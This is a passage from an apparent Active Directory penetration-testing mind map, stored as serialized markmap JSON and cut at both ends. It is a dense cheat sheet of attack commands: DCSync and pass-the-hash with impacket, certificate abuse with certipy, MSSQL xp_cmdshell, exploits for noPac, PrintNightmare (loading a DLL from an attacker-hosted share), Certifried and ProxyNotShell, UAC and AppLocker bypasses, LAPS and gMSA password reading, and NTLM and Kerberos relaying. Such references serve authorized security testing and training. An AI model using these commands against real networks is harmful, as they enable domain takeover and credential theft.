&lt;newticket.ccache&gt; -altservice &quot;&lt;service&gt;/&lt;target&gt;&quot; #pr 1256</code>","children":[],"payload":{"tag":"li","lines":"1479,1481"}}],"payload":{"tag":"li","lines":"1478,1481"}}],"payload":{"tag":"li","lines":"1470,1481"}},{"content":"\n<p data-lines=\"1481,1482\">Aeskey &gt;&gt;&gt; Admin</p>","children":[{"content":"<code>impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)</code>","children":[],"payload":{"tag":"li","lines":"1482,1483"}},{"content":"<code>proxychains secretsdump.py -aesKey &lt;key&gt; &apos;&lt;domain&gt;&apos;/&apos;&lt;user&gt;&apos;@&apos;&lt;ip&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1483,1485"}}],"payload":{"tag":"li","lines":"1481,1485"}}],"payload":{"tag":"h3","lines":"1469,1470"}},{"content":"Socks (relay)","children":[{"content":"<code>proxychains lookupsid.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -no-pass -domain-sids</code>","children":[],"payload":{"tag":"li","lines":"1486,1487"}},{"content":"<code>proxychains mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -no-pass</code> &gt;&gt;&gt; MSSQL","children":[],"payload":{"tag":"li","lines":"1487,1488"}},{"content":"<code>proxychains secretsdump.py -no-pass &apos;&lt;domain&gt;&apos;/&apos;&lt;user&gt;&apos;@&apos;&lt;ip&gt;&apos;</code> &gt;&gt;&gt; DCSYNC","children":[],"payload":{"tag":"li","lines":"1488,1489"}},{"content":"<code>proxychains smbclient.py -no-pass &lt;user&gt;@&lt;ip&gt;</code> &gt;&gt;&gt; Search files","children":[],"payload":{"tag":"li","lines":"1489,1490"}},{"content":"<code>proxychains atexec.py  -no-pass  &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; &quot;command&quot;</code> &gt;&gt;&gt; Authority/System","children":[],"payload":{"tag":"li","lines":"1490,1491"}},{"content":"<code>proxychains smbexec.py  -no-pass  &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;</code> &gt;&gt;&gt; Authority/System","children":[],"payload":{"tag":"li","lines":"1491,1493"}}],"payload":{"tag":"h3","lines":"1485,1486"}},{"content":"Certificate (pfx)","children":[{"content":"unpac the hash","children":[{"content":"<code>certipy auth -pfx &lt;crt_file&gt; -dc-ip &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1495,1496"}},{"content":"<code>gettgtpkinit.py -cert-pfx &lt;crt.pfx&gt; -pfx-pass &lt;crt_pass&gt; &quot;&lt;domain&gt;/&lt;dc_name&gt;&quot; &lt;tgt.ccache&gt;</code>","children":[{"content":"<code>getnthash.py -key &apos;&lt;AS-REP encryption key&gt;&apos; &apos;&lt;domain&gt;&apos;/&apos;&lt;dc_name&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1497,1498"}}],"payload":{"tag":"li","lines":"1496,1498"}}],"payload":{"tag":"li","lines":"1494,1498"}},{"content":"Pass the certificate","children":[{"content":"pkinit","children":[{"content":"<code>gettgtpkinit.py -cert-pfx &quot;&lt;pfx_file&gt;&quot; ^[-pfx-pass  &quot;&lt;cert-password&gt;&quot;] &quot;&lt;fqdn_domain&gt;/&lt;user&gt;&quot; &quot;&lt;tgt_ccache_file&gt;&quot;</code>","children":[],"payload":{"tag":"li","lines":"1500,1501"}},{"content":"<code>Rubeus.exe asktgt /user:&quot;&lt;username&gt;&quot; /certificate:&quot;&lt;pfx_file&gt;&quot; [/password:&quot;&lt;certificate_password&gt;&quot;] /domain:&quot;&lt;fqdn-domain&gt;&quot; /dc:&quot;&lt;dc&gt;&quot; /show</code>","children":[],"payload":{"tag":"li","lines":"1501,1502"}},{"content":"<code>certipy auth -pfx &lt;crt_file&gt; -dc-ip &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1502,1503"}}],"payload":{"tag":"li","lines":"1499,1503"}},{"content":"schannel","children":[{"content":"<code>certipy auth -pfx &lt;pfx_file&gt; -ldap-shell</code>","children":[{"content":"add_computer","children":[{"content":"Set RBCD &gt;&gt;&gt; RBCD","children":[],"payload":{"tag":"li","lines":"1506,1507"}}],"payload":{"tag":"li","lines":"1505,1507"}}],"payload":{"tag":"li","lines":"1504,1507"}},{"content":"<code>certipy cert -pfx &quot;&lt;pfx_file&gt;&quot; -nokey -out &quot;user.crt&quot;</code>","children":[{"content":"<code>certipy cert -pfx &quot;&lt;pfx_file&gt;&quot; -nocert -out &quot;user.key&quot;</code>","children":[{"content":"<code>passthecert.py -action ldap-shell -crt &lt;user.crt&gt; -key &lt;user.key&gt; -domain &lt;domain&gt; -dc-ip &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1509,1511"}}],"payload":{"tag":"li","lines":"1508,1511"}}],"payload":{"tag":"li","lines":"1507,1511"}}],"payload":{"tag":"li","lines":"1503,1511"}}],"payload":{"tag":"li","lines":"1498,1511"}}],"payload":{"tag":"h3","lines":"1493,1494"}},{"content":"MSSQL","children":[{"content":"find mssql access","children":[{"content":"<code>nxc mssql &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;</code> &gt;&gt;&gt; MSSQL","children":[],"payload":{"tag":"li","lines":"1513,1514"}}],"payload":{"tag":"li","lines":"1512,1514"}},{"content":"Users or Computers with SQL admin","children":[],"payload":{"tag":"li","lines":"1514,1515"}},{"content":"<code>MATCH p=(u:Base)-[:SQLAdmin]-&gt;(c:Computer) RETURN p</code> &gt;&gt;&gt; MSSQL","children":[],"payload":{"tag":"li","lines":"1515,1516"}},{"content":"<code>mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>","children":[{"content":"<code>enum_db</code>","children":[],"payload":{"tag":"li","lines":"1517,1518"}},{"content":"<code>enable_xp_cmdshell</code>","children":[{"content":"<code>xp_cmdshell &lt;cmd&gt;</code> &gt;&gt;&gt; Low Access","children":[],"payload":{"tag":"li","lines":"1519,1520"}}],"payload":{"tag":"li","lines":"1518,1520"}},{"content":"<code>enum_impersonate</code>","children":[{"content":"<code>exec_as_user &lt;user&gt;</code> &gt;&gt;&gt; MSSQL","children":[],"payload":{"tag":"li","lines":"1521,1522"}},{"content":"<code>exec_as_login &lt;login&gt;</code> &gt;&gt;&gt; MSSQL","children":[],"payload":{"tag":"li","lines":"1522,1523"}}],"payload":{"tag":"li","lines":"1520,1523"}},{"content":"<code>xp_dir_tree &lt;ip&gt;</code> &gt;&gt;&gt; COERCE SMB","children":[],"payload":{"tag":"li","lines":"1523,1524"}},{"content":"<code>trustlink</code>","children":[{"content":"<code>sp_linkedservers</code>","children":[{"content":"<code>use_link</code> &gt;&gt;&gt; MSSQL || Trust","children":[],"payload":{"tag":"li","lines":"1526,1528"}}],"payload":{"tag":"li","lines":"1525,1528"}}],"payload":{"tag":"li","lines":"1524,1528"}}],"payload":{"tag":"li","lines":"1516,1528"}}],"payload":{"tag":"h3","lines":"1511,1512"}}],"payload":{"tag":"h2","lines":"1426,1427"}},{"content":"Know vulnerabilities authenticated","children":[{"content":"MS14-068 &gt;&gt;&gt; PTT &gt;&gt;&gt; Domain admin || Admin","children":[{"content":"<code>findSMB2UPTime.py &lt;ip&gt;</code>","children":[{"content":"<code>ms14-068.py -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -s &lt;user_sid&gt; -d &lt;dc_fqdn&gt;</code>","children":[],"payload":{"tag":"li","lines":"1532,1533"}},{"content":"<code>msf&gt; use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</code>","children":[],"payload":{"tag":"li","lines":"1533,1534"}},{"content":"<code>goldenPac.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@target</code>","children":[],"payload":{"tag":"li","lines":"1534,1536"}}],"payload":{"tag":"li","lines":"1531,1536"}}],"payload":{"tag":"h3","lines":"1530,1531"}},{"content":"GPP MS14-025 &gt;&gt;&gt; Domain admin","children":[{"content":"<code>msf&gt; use auxiliary/scanner/smb/smb_enum_gpp</code>","children":[],"payload":{"tag":"li","lines":"1537,1538"}},{"content":"<code>findstr /S /I cpassword \\\\&lt;domain_fqdn&gt;\\sysvol\\&lt;domain_fqdn&gt;\\policies\\*.xml</code>","children":[],"payload":{"tag":"li","lines":"1538,1539"}},{"content":"<code>Get-GPPPassword.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;dc_fqdn&gt;</code>","children":[],"payload":{"tag":"li","lines":"1539,1541"}}],"payload":{"tag":"h3","lines":"1536,1537"}},{"content":"PrivExchange (CVE-2019-0724, CVE-2019-0686) &gt;&gt;&gt; HTTP Coerce &gt;&gt;&gt; Domain admin || Admin","children":[{"content":"<code>privexchange.py -ah &lt;attacker_ip&gt; &lt;exchange_host&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;password&gt;</code>","children":[],"payload":{"tag":"li","lines":"1542,1544"}}],"payload":{"tag":"h3","lines":"1541,1542"}},{"content":"noPac (CVE-2021-42287, CVE-2021-42278) &gt;&gt;&gt; PTT &gt;&gt;&gt; DCSYNC &gt;&gt;&gt; Domain admin","children":[{"content":"<code>nxc smb &lt;ip&gt; -u &apos;user&apos; -p &apos;pass&apos; -M nopac #scan</code>","children":[],"payload":{"tag":"li","lines":"1545,1546"}},{"content":"<code>noPac.exe -domain &lt;domain&gt; -user &lt;user&gt; -pass &lt;password&gt; /dc &lt;dc_fqdn&gt; /mAccount &lt;machine_account&gt; /mPassword &lt;machine_password&gt; /service cifs /ptt</code>","children":[],"payload":{"tag":"li","lines":"1546,1548"}}],"payload":{"tag":"h3","lines":"1544,1545"}},{"content":"PrintNightmare (CVE-2021-1675, CVE-2021-34527) &gt;&gt;&gt; Admin","children":[{"content":"<code>nxc smb &lt;ip&gt; -u &apos;user&apos; -p &apos;pass&apos; -M printnightmare #scan</code>","children":[],"payload":{"tag":"li","lines":"1549,1550"}},{"content":"<code>printnightmare.py -dll &apos;\\\\&lt;attacker_ip&gt;\\smb\\add_user.dll&apos; &apos;&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1550,1552"}}],"payload":{"tag":"h3","lines":"1548,1549"}},{"content":"Certifried (CVE-2022-26923) &gt;&gt;&gt; PTT &gt;&gt;&gt; DCSYNC &gt;&gt;&gt; Domain admin","children":[{"content":"Create account","children":[{"content":"<code>certipy account create -u &lt;user&gt;@&lt;domain&gt; -p &apos;&lt;password&gt;&apos; -user &apos;certifriedpc&apos; -pass &apos;certifriedpass&apos; -dns &apos;&lt;fqdn_dc&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1554,1555"}}],"payload":{"tag":"li","lines":"1553,1555"}},{"content":"Request","children":[{"content":"<code>certipy req -u &apos;certifriedpc&#x24;&apos;@&lt;domain&gt; -p &apos;certifriedpass&apos; -target &lt;ca_fqdn&gt; -ca &lt;ca_name&gt; -template Machine</code>","children":[],"payload":{"tag":"li","lines":"1556,1557"}}],"payload":{"tag":"li","lines":"1555,1557"}},{"content":"Authentication","children":[{"content":"<code>certipy auth -pfx &lt;pfx_file&gt; -username &apos;&lt;dc&gt;&#x24;&apos; -domain &lt;domain&gt; -dc-ip &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1558,1560"}}],"payload":{"tag":"li","lines":"1557,1560"}}],"payload":{"tag":"h3","lines":"1552,1553"}},{"content":"ProxyNotShell (CVE-2022-41040, CVE-2022-41082) &gt;&gt;&gt; Admin","children":[{"content":"<code>poc_aug3.py &lt;host&gt; &lt;username&gt; &lt;password&gt; &lt;command&gt;</code>","children":[],"payload":{"tag":"li","lines":"1561,1563"}}],"payload":{"tag":"h3","lines":"1560,1561"}}],"payload":{"tag":"h2","lines":"1528,1529"}},{"content":"Low access (Privilege escalation)","children":[{"content":"Bypass Applocker &gt;&gt;&gt; Low access (without applocker)","children":[{"content":"Get-Applocker infos","children":[{"content":"<code>Get-ChildItem -Path HKLM:\\SOFTWARE\\Policies \\Microsoft\\Windows\\SrpV2\\Exe (dll/msi/...)</code>","children":[],"payload":{"tag":"li","lines":"1567,1568"}}],"payload":{"tag":"li","lines":"1566,1568"}},{"content":"files in writables paths","children":[{"content":"C:\\Windows\\Temp","children":[],"payload":{"tag":"li","lines":"1569,1570"}},{"content":"C:\\Windows\\Tasks","children":[],"payload":{"tag":"li","lines":"1570,1571"}}],"payload":{"tag":"li","lines":"1568,1571"}},{"content":"<code>installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe</code>","children":[],"payload":{"tag":"li","lines":"1571,1572"}},{"content":"<code>mshta.exe my.hta</code>","children":[],"payload":{"tag":"li","lines":"1572,1573"}},{"content":"<code>MsBuild.exe pshell.xml</code>","children":[],"payload":{"tag":"li","lines":"1573,1575"}}],"payload":{"tag":"h3","lines":"1565,1566"}},{"content":"UAC bypass &gt;&gt;&gt; Admin","children":[{"content":"<code>Fodhelper.exe</code>","children":[],"payload":{"tag":"li","lines":"1576,1577"}},{"content":"<code>wsreset.exe</code>","children":[],"payload":{"tag":"li","lines":"1577,1578"}},{"content":"<code>msdt.exe</code>","children":[],"payload":{"tag":"li","lines":"1578,1580"}}],"payload":{"tag":"h3","lines":"1575,1576"}},{"content":"Auto Enum &gt;&gt;&gt; Admin","children":[{"content":"<code>winPEASany_ofs.exe</code>","children":[],"payload":{"tag":"li","lines":"1581,1582"}},{"content":"<code>.\\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended&quot;</code>","children":[],"payload":{"tag":"li","lines":"1582,1584"}}],"payload":{"tag":"h3","lines":"1580,1581"}},{"content":"Search files &gt;&gt;&gt; User Account","children":[{"content":"<code>findstr /si &apos;pass&apos; *.txt *.xml *.docx *.ini</code>","children":[],"payload":{"tag":"li","lines":"1585,1587"}}],"payload":{"tag":"h3","lines":"1584,1585"}},{"content":"Exploit &gt;&gt;&gt; Admin","children":[{"content":"SMBGhost CVE-2020-0796 @CVE@","children":[],"payload":{"tag":"li","lines":"1588,1589"}},{"content":"CVE-2021-36934 (HiveNightmare/SeriousSAM) @CVE@","children":[{"content":"<code>vssadmin list shadows</code>","children":[],"payload":{"tag":"li","lines":"1590,1592"}}],"payload":{"tag":"li","lines":"1589,1592"}}],"payload":{"tag":"h3","lines":"1587,1588"}},{"content":"Webdav &gt;&gt;&gt; HTTP Coerce","children":[{"content":"open file <file>.searchConnector-ms\n<ul data-lines=\"1594,1597\">\n<li data-lines=\"1594,1597\"><code>dnstool.py -u &lt;domain&gt;\\&lt;user&gt; -p &lt;pass&gt; --record &apos;attacker&apos; --action add --data &lt;ip_attacker&gt; &lt;dc_ip&gt;</code>\n<ul data-lines=\"1595,1597\">\n<li data-lines=\"1595,1597\"><code>petitpotam.py -u &apos;&lt;user&gt;&apos; -p &lt;pass&gt; -d &apos;&lt;domain&gt;&apos; &quot;attacker@80/random.txt&quot; &lt;ip&gt;</code></li>\n</ul>\n</li>\n</ul>\n</file>","children":[],"payload":{"tag":"li","lines":"1593,1597"}}],"payload":{"tag":"h3","lines":"1592,1593"}},{"content":"Kerberos Relay &gt;&gt;&gt; Admin","children":[{"content":"<code>KrbRelayUp.exe relay -Domain &lt;domain&gt; -CreateNewComputerAccount -ComputerName &lt;computer&#x24;&gt; -ComputerPassword &lt;password&gt;</code>","children":[{"content":"<code>KrbRelayUp.exe spawn -m rbcd -d &lt;domain&gt; -dc &lt;dc&gt; -cn &lt;computer_name&gt;-cp &lt;omputer_pass&gt;</code>","children":[],"payload":{"tag":"li","lines":"1599,1601"}}],"payload":{"tag":"li","lines":"1598,1601"}}],"payload":{"tag":"h3","lines":"1597,1598"}},{"content":"From Service account (SEImpersonate) &gt;&gt;&gt; Admin","children":[{"content":"RoguePatato @CVE@","children":[],"payload":{"tag":"li","lines":"1602,1603"}},{"content":"GodPotato @CVE@","children":[],"payload":{"tag":"li","lines":"1603,1604"}},{"content":"PrintSpoofer @CVE@","children":[],"payload":{"tag":"li","lines":"1604,1605"}},{"content":"RemotePotato0","children":[],"payload":{"tag":"li","lines":"1605,1607"}}],"payload":{"tag":"h3","lines":"1601,1602"}}],"payload":{"tag":"h2","lines":"1563,1564"}},{"content":"ACLs/ACEs permissions","children":[{"content":"Dcsync &gt;&gt;&gt; Domain Admin || Lateral move || Crack hash","children":[{"content":"Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts","children":[],"payload":{"tag":"li","lines":"1610,1611"}},{"content":"<code>mimikatz lsadump::dcsync /domain:&lt;target_domain&gt; /user:&lt;target_domain&gt;\\administrator</code>","children":[],"payload":{"tag":"li","lines":"1611,1612"}},{"content":"<code>secretsdump.py &apos;&lt;domain&gt;&apos;/&apos;&lt;user&gt;&apos;:&apos;&lt;password&gt;&apos;@&apos;&lt;domain_controller&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1612,1614"}}],"payload":{"tag":"h3","lines":"1609,1610"}},{"content":"can change msDS-KeyCredentialLInk (Generic Write) + ADCS &gt;&gt;&gt; PassTheCertificate","children":[{"content":"Shadow Credentials","children":[{"content":"<code>certipy shadow auto &apos;-u &lt;user&gt;@&lt;domain&gt;&apos; -p &lt;password&gt; -account &apos;&lt;target_account&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1616,1617"}},{"content":"<code>pywhisker.py -d &quot;FQDN_DOMAIN&quot; -u &quot;user1&quot; -p &quot;CERTIFICATE_PASSWORD&quot; --target &quot;TARGET_SAMNAME&quot; --action &quot;list&quot;</code>","children":[],"payload":{"tag":"li","lines":"1617,1619"}}],"payload":{"tag":"li","lines":"1615,1619"}}],"payload":{"tag":"h3","lines":"1614,1615"}},{"content":"On Group","children":[{"content":"GenericAll/GenericWrite/Self/Add Extended Rights","children":[{"content":"Add member to the group","children":[],"payload":{"tag":"li","lines":"1621,1622"}}],"payload":{"tag":"li","lines":"1620,1622"}},{"content":"Write Owner","children":[{"content":"Grant Ownership","children":[],"payload":{"tag":"li","lines":"1623,1624"}}],"payload":{"tag":"li","lines":"1622,1624"}},{"content":"WriteDACL + WriteOwner","children":[{"content":"Grant rights","children":[{"content":"Give yourself generic all","children":[],"payload":{"tag":"li","lines":"1626,1628"}}],"payload":{"tag":"li","lines":"1625,1628"}}],"payload":{"tag":"li","lines":"1624,1628"}}],"payload":{"tag":"h3","lines":"1619,1620"}},{"content":"On Computer","children":[{"content":"GenericAll / GenericWrite","children":[{"content":"msDs-AllowedToActOnBehalf &gt;&gt;&gt; RBCD","children":[],"payload":{"tag":"li","lines":"1630,1631"}},{"content":"add Key Credentials &gt;&gt;&gt; shadow credentials","children":[],"payload":{"tag":"li","lines":"1631,1633"}}],"payload":{"tag":"li","lines":"1629,1633"}}],"payload":{"tag":"h3","lines":"1628,1629"}},{"content":"On User","children":[{"content":"GenericAll / GenericWrite","children":[{"content":"Change password","children":[{"content":"<code>net user &lt;user&gt; &lt;password&gt; /domain</code> &gt;&gt;&gt; User with clear text pass","children":[],"payload":{"tag":"li","lines":"1636,1637"}}],"payload":{"tag":"li","lines":"1635,1637"}},{"content":"add SPN (target kerberoasting)","children":[{"content":"<code>targetedKerberoast.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt;</code> &gt;&gt;&gt; Hash found (TGS)","children":[],"payload":{"tag":"li","lines":"1638,1639"}}],"payload":{"tag":"li","lines":"1637,1639"}},{"content":"add key credentials &gt;&gt;&gt; shadow credentials","children":[],"payload":{"tag":"li","lines":"1639,1640"}},{"content":"login script &gt;&gt;&gt; Access","children":[],"payload":{"tag":"li","lines":"1640,1641"}}],"payload":{"tag":"li","lines":"1634,1641"}},{"content":"ForceChangePassword","children":[{"content":"<code>net user &lt;user&gt; &lt;password&gt; /domain</code> &gt;&gt;&gt; User with clear text pass","children":[],"payload":{"tag":"li","lines":"1642,1644"}}],"payload":{"tag":"li","lines":"1641,1644"}}],"payload":{"tag":"h3","lines":"1633,1634"}},{"content":"On OU","children":[{"content":"Write Dacl","children":[{"content":"ACE Inheritance","children":[{"content":"Grant rights","children":[],"payload":{"tag":"li","lines":"1647,1648"}}],"payload":{"tag":"li","lines":"1646,1648"}}],"payload":{"tag":"li","lines":"1645,1648"}},{"content":"GenericAll / GenericWrite / Manage Group Policy Links","children":[{"content":"<code>OUned.py --config config.ini</code>","children":[],"payload":{"tag":"li","lines":"1649,1651"}}],"payload":{"tag":"li","lines":"1648,1651"}}],"payload":{"tag":"h3","lines":"1644,1645"}},{"content":"ReadGMSAPassword","children":[{"content":"<code>gMSADumper.py -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; -d &apos;&lt;domain&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1652,1653"}},{"content":"<code>nxc ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --gmsa</code>","children":[],"payload":{"tag":"li","lines":"1653,1654"}},{"content":"<code>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldaps://&lt;dc_ip&gt; gmsa</code>","children":[],"payload":{"tag":"li","lines":"1654,1656"}}],"payload":{"tag":"h3","lines":"1651,1652"}},{"content":"Get LAPS passwords","children":[{"content":"Who can read LAPS","children":[{"content":"<code>MATCH p=(g:Base)-[:ReadLAPSPassword]-&gt;(c:Computer) RETURN p</code>","children":[],"payload":{"tag":"li","lines":"1658,1659"}}],"payload":{"tag":"li","lines":"1657,1659"}},{"content":"Read LAPS &gt;&gt;&gt; Admin","children":[{"content":"<code>Get-LapsADPassword -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\\&lt;login&gt; | Format-Table -AutoSize</code>","children":[],"payload":{"tag":"li","lines":"1660,1661"}},{"content":"<code>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; laps</code>","children":[],"payload":{"tag":"li","lines":"1661,1662"}},{"content":"<code>foreach (&#x24;objResult in &#x24;colResults){&#x24;objComputer = &#x24;objResult.Properties; &#x24;objComputer.name|where {&#x24;objcomputer.name -ne &#x24;env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName &#x24;_}}}</code>","children":[],"payload":{"tag":"li","lines":"1662,1663"}},{"content":"<code>nxc ldap &lt;dc_ip&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; --module laps</code>","children":[],"payload":{"tag":"li","lines":"1663,1664"}},{"content":"<code>msf&gt; use post/windows/gather/credentials/enum_laps</code>","children":[],"payload":{"tag":"li","lines":"1664,1666"}}],"payload":{"tag":"li","lines":"1659,1666"}}],"payload":{"tag":"h3","lines":"1656,1657"}},{"content":"GPO","children":[{"content":"Who can control GPOs","children":[{"content":"<code>MATCH p=((n:Base)-[]-&gt;(gp:GPO)) RETURN p</code>","children":[],"payload":{"tag":"li","lines":"1668,1669"}}],"payload":{"tag":"li","lines":"1667,1669"}},{"content":"SID of principals that can create new GPOs in the domain","children":[{"content":"<code>Get-DomainObjectAcl -SearchBase &quot;CN=Policies,CN=System,DC=blah,DC=com&quot; -ResolveGUIDs  | ? { &#x24;_.ObjectAceType -eq &quot;Group-Policy-Container&quot; } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl</code>","children":[],"payload":{"tag":"li","lines":"1670,1671"}}],"payload":{"tag":"li","lines":"1669,1671"}},{"content":"Return the principals that can write to the GP-Link attribute on OUs","children":[{"content":"<code>Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { &#x24;_.ObjectAceType -eq &quot;GP-Link&quot; -and &#x24;_.ActiveDirectoryRights -match &quot;WriteProperty&quot; } | select ObjectDN, SecurityIdentifier | fl</code>","children":[],"payload":{"tag":"li","lines":"1672,1673"}}],"payload":{"tag":"li","lines":"1671,1673"}},{"content":"Generic Write on  GPO","children":[{"content":"Abuse GPO &gt;&gt;&gt; ACCESS","children":[],"payload":{"tag":"li","lines":"1674,1676"}}],"payload":{"tag":"li","lines":"1673,1676"}}],"payload":{"tag":"h3","lines":"1666,1667"}},{"content":"DNS Admin","children":[{"content":"DNSadmins abuse (CVE-2021-40469) @CVE@ &gt;&gt;&gt; Admin","children":[{"content":"<code>dnscmd.exe /config /serverlevelplugindll &lt;\\\\path\\to\\dll&gt; # need a dnsadmin user</code>","children":[],"payload":{"tag":"li","lines":"1678,1679"}},{"content":"<code>sc \\\\DNSServer stop dns sc \\\\DNSServer start dns</code>","children":[],"payload":{"tag":"li","lines":"1679,1681"}}],"payload":{"tag":"li","lines":"1677,1681"}}],"payload":{"tag":"h3","lines":"1676,1677"}}],"payload":{"tag":"h2","lines":"1607,1608"}},{"content":"Man In The Middle (Listen and Relay)","children":[{"content":"Listen &gt;&gt;&gt; Hash NTLMv1 or NTLMv2 || Username || Credentials (ldap/http)","children":[{"content":"<code>responder -l &lt;interface&gt; #use --lm to force downgrade</code>","children":[],"payload":{"tag":"li","lines":"1684,1685"}},{"content":"<code>smbclient.py</code>","children":[],"payload":{"tag":"li","lines":"1685,1687"}}],"payload":{"tag":"h3","lines":"1683,1684"}},{"content":"NTLM relay","children":[{"content":"\n<p data-lines=\"1688,1689\">MS08-068 self relay @CVE@</p>","children":[{"content":"<code>msf&gt; exploit/windows/smb_smb_relay # windows 2000 / windows server 2008</code>","children":[],"payload":{"tag":"li","lines":"1689,1691"}}],"payload":{"tag":"li","lines":"1688,1691"}},{"content":"\n<p data-lines=\"1691,1692\">SMB -&gt; LDAP(S)</p>","children":[{"content":"NTLMv1","children":[{"content":"remove mic (no CVE needed)  &gt;&gt;&gt; see LDAP(S)","children":[],"payload":{"tag":"li","lines":"1693,1694"}}],"payload":{"tag":"li","lines":"1692,1694"}},{"content":"NTLMv2","children":[{"content":"Remove mic (CVE-2019-1040) @CVE@ &gt;&gt;&gt; see LDAP(S)","children":[],"payload":{"tag":"li","lines":"1695,1697"}}],"payload":{"tag":"li","lines":"1694,1697"}}],"payload":{"tag":"li","lines":"1691,1697"}},{"content":"\n<p data-lines=\"1697,1698\">HTTP(S) -&gt; LDAP(S)</p>","children":[{"content":"Usually from webdav coerce &gt;&gt;&gt; see LDAP(S)","children":[],"payload":{"tag":"li","lines":"1698,1700"}}],"payload":{"tag":"li","lines":"1697,1700"}},{"content":"\n<p data-lines=\"1700,1701\">To LDAP(S)</p>","children":[{"content":"Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)","children":[{"content":"<code>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --add-computer &lt;computer_name&gt; &lt;computer_password&gt; --delegate-access </code> &gt;&gt;&gt; RBCD","children":[],"payload":{"tag":"li","lines":"1702,1703"}},{"content":"<code>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --shadow-credentials --shadow-target &apos;&lt;dc_name&#x24;&gt;&apos;</code> &gt;&gt;&gt; Shadow Credentials","children":[],"payload":{"tag":"li","lines":"1703,1704"}},{"content":"<code>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --escalate-user &lt;user&gt;</code> &gt;&gt;&gt; Domain admin","children":[],"payload":{"tag":"li","lines":"1704,1705"}},{"content":"<code>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111</code> &gt;&gt;&gt; LDAP SHELL","children":[],"payload":{"tag":"li","lines":"1705,1707"}}],"payload":{"tag":"li","lines":"1701,1707"}}],"payload":{"tag":"li","lines":"1700,1707"}},{"content":"\n<p data-lines=\"1707,1708\">To SMB</p>","children":[{"content":"Relay to SMB (if SMB is not signed)","children":[{"content":"Find SMB not signed targets (default if not a Domain controler)","children":[{"content":"<code>nxc smb &lt;ip_range&gt; --gen-relay-list smb_unsigned_ips.txt</code>","children":[],"payload":{"tag":"li","lines":"1710,1711"}}],"payload":{"tag":"li","lines":"1709,1711"}},{"content":"<code>ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks</code> &gt;&gt;&gt; SMB Socks","children":[],"payload":{"tag":"li","lines":"1711,1713"}}],"payload":{"tag":"li","lines":"1708,1713"}}],"payload":{"tag":"li","lines":"1707,1713"}},{"content":"\n<p data-lines=\"1713,1714\">To HTTP</p>","children":[{"content":"Relay to CA web enrollement &gt;&gt;&gt; ESC8","children":[],"payload":{"tag":"li","lines":"1714,1715"}},{"content":"Relay to WSUS &gt;&gt;&gt; WSUS","children":[],"payload":{"tag":"li","lines":"1715,1717"}}],"payload":{"tag":"li","lines":"1713,1717"}},{"content":"\n<p data-lines=\"1717,1718\">To MsSQL</p>","children":[{"content":"<code>ntlmrelayx.py -t mssql://&lt;ip&gt; [-smb2support] -socks</code> &gt;&gt;&gt; MSSQL Socks","children":[],"payload":{"tag":"li","lines":"1718,1720"}}],"payload":{"tag":"li","lines":"1717,1720"}},{"content":"\n<p data-lines=\"1720,1721\">SMB -&gt; NETLOGON</p>","children":[{"content":"Zero-Logon (safe method) (CVE-202-1472) @CVE@","children":[{"content":"Relay one dc to another","children":[{"content":"<code>ntlmrelayx.py -t dcsync://&lt;dc_to_ip&gt; -smb2support -auth-smb &lt;user&gt;:&lt;password&gt;</code> &gt;&gt;&gt; DCSYNC","children":[],"payload":{"tag":"li","lines":"1723,1725"}}],"payload":{"tag":"li","lines":"1722,1725"}}],"payload":{"tag":"li","lines":"1721,1725"}}],"payload":{"tag":"li","lines":"1720,1725"}}],"payload":{"tag":"h3","lines":"1687,1688"}},{"content":"Kerberos relay","children":[{"content":"To HTTP","children":[{"content":"<code>krbrelayx.py -t &apos;http://&lt;pki&gt;/certsrv/certfnsh.asp&apos; --adcs --template DomainController -v &apos;&lt;target_netbios&gt;&#x24;&apos; 